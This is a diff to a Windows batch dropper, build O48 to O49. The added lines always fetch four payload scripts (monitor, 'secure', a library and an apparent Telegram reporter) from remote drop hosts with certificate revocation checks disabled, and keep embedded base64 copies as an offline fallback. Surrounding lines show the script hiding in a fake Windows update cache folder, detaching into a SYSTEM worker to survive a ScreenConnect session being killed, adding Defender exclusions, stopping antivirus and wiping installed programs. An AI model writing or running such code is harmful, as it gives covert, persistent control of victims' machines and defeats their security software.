@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O48 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
+REM OWN BUILD 20260802O49 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -35,7 +35,7 @@ icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI
 
 REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
 if /I not "%~1"=="_RUN" (
-  echo === OWN BUILD 20260802O48 ===
+  echo === OWN BUILD 20260802O49 ===
   echo whoami:
   whoami
   set "ELEV=0"
@@ -63,7 +63,7 @@ if /I not "%~1"=="_RUN" (
     echo ERROR: cannot write unique runner under %BOOT%
     exit /b 6
   )
-  findstr /C:"OWN BUILD 20260802O48" "!RUNNER!" >nul 2>&1
+  findstr /C:"OWN BUILD 20260802O49" "!RUNNER!" >nul 2>&1
   if errorlevel 1 (
     echo ERROR: runner copy is not O41 - abort
     exit /b 7
@@ -146,43 +146,43 @@ if not exist "%LOG%" (
   echo worker_start %DATE% %TIME%>>"%LOG%"
 )
 
-echo [0] Extract embedded payloads (self-contained mode)...
-attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
-attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
-attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
-attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
-call :Extract B64_MON "%WD%\own_mon.cmd"
-call :Extract B64_SEC "%WD%\own_secure.cmd"
-call :Extract B64_TGR "%WD%\tg_report.ps1"
-call :Extract B64_LIB "%WD%\own_lib.ps1"
-if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
-echo embed_extract_done>>"%LOG%"
+echo [0] Refresh core payloads (always fetch latest; embed = offline fallback only)...
+set "STG=%SystemRoot%\Temp\.upd"
+if not exist "%STG%" mkdir "%STG%" >nul 2>&1
+attrib -h -s -r "%WD%" >nul 2>&1
+icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1
+attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_secure.cmd" "%WD%\tg_report.ps1" "%WD%\own_lib.ps1" >nul 2>&1
 
-REM O41: force-refresh any stale/missing payload (old hardening used to freeze these files)
-findstr /C:"20260802M32" "%WD%\own_mon.cmd" >nul 2>&1
-if errorlevel 1 (
-  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
-  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
+rem O48: ALWAYS pull latest from repo (staged in Temp, never blocked by WD lock).
+rem Embed below is only a fallback when there is no network.
+set "NETOK=0"
+"%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP%/own_lib.ps1?t=%RANDOM%" >nul 2>&1
+if not exist "%STG%\own_lib.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
+findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && set "NETOK=1"
+
+if "%NETOK%"=="1" (
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP%/own_mon.cmd?t=%RANDOM%" >nul 2>&1
+  if not exist "%STG%\own_mon.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP%/own_secure.cmd?t=%RANDOM%" >nul 2>&1
+  if not exist "%STG%\own_secure.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP%/tg_report.ps1?t=%RANDOM%" >nul 2>&1
+  if not exist "%STG%\tg_report.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
+  rem BUILD-verify each then move into WD
+  findstr /C:"OWN_MON  BUILD" "%STG%\own_mon.cmd" >nul 2>&1 && for %%F in ("%STG%\own_mon.cmd") do if %%~zF GTR 1500 move /y "%STG%\own_mon.cmd" "%WD%\own_mon.cmd" >nul 2>&1
+  findstr /C:"OWN_SECURE BUILD" "%STG%\own_secure.cmd" >nul 2>&1 && for %%F in ("%STG%\own_secure.cmd") do if %%~zF GTR 800 move /y "%STG%\own_secure.cmd" "%WD%\own_secure.cmd" >nul 2>&1
+  findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && for %%F in ("%STG%\own_lib.ps1") do if %%~zF GTR 1500 move /y "%STG%\own_lib.ps1" "%WD%\own_lib.ps1" >nul 2>&1
+  findstr /C:"TG_REPORT BUILD" "%STG%\tg_report.ps1" >nul 2>&1 && for %%F in ("%STG%\tg_report.ps1") do if %%~zF GTR 1500 move /y "%STG%\tg_report.ps1" "%WD%\tg_report.ps1" >nul 2>&1
+  echo core_fetch_latest_done>>"%LOG%"
+) else (
+  echo net_offline_using_embed>>"%LOG%"
+  call :Extract B64_MON "%WD%\own_mon.cmd"
+  call :Extract B64_SEC "%WD%\own_secure.cmd"
+  call :Extract B64_TGR "%WD%\tg_report.ps1"
+  call :Extract B64_LIB "%WD%\own_lib.ps1"
+  if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
+  echo embed_extract_done>>"%LOG%"
 )
-findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
-if errorlevel 1 (
-  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
-  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
-)
-findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
-if errorlevel 1 (
-  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
-  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
-)
-findstr /C:"20260802L22" "%WD%\own_lib.ps1" >nul 2>&1
-if errorlevel 1 (
-  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
-  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
-)
+del /f /q "%STG%\own_mon.cmd" "%STG%\own_secure.cmd" "%STG%\own_lib.ps1" "%STG%\tg_report.ps1" >nul 2>&1
 
 echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
 echo av_reg_begin>>"%LOG%"
